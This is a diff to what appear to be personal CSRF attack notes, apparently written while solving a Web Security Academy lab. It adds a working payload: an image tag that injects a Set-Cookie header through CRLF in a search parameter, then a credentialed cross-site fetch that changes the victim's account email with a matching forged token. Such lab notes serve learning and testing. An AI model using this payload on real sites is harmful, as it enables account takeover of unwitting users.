@@ -68,20 +68,23 @@ Host: 0a35003b04de89b2824392b5001e00b4.web-security-academy.net
 #### CSRF using Javascript fetch()
 ```
 <html>
-  <script>
-    fetch("https://example.com", {
-      method: "POST",
-      credentials: "include",
-      mode: "cors",
-      body: JSON.stringify(donnees),
-      headers: {
-            "Content-Type": "application/json",
-            // 'Content-Type': 'application/x-www-form-urlencoded',
-          },
-    });
+    <img src="https://0a6c003b049f971980cc0d63006a00f7.web-security-academy.net/?search=aaa%3b%20SameSite=None%3b%20Secure%3b%20Partitioned%3b%0d%0aSet-Cookie:%20csrf=toto%3b%20SameSite=None%3b%20Secure%3bPartitioned%3b">
+    <script>
+        fetch("https://0a6c003b049f971980cc0d63006a00f7.web-security-academy.net/my-account/change-email", {
+            method: "POST",
+            credentials: "include",
+            mode: "no-cors",
+            headers: {
+              "Content-Type": "application/json",
+              // 'Content-Type': 'application/x-www-form-urlencoded'
+            },
+            body: 'csrf=toto&email=tttt3@tttt.com'
+            // body: JSON.stringify({'field':'value'})
+        });
   </script>
 </html>
 ```
+
 #### CSRF using Javascript XMLHTTPRequest()
 ```
 // GET request
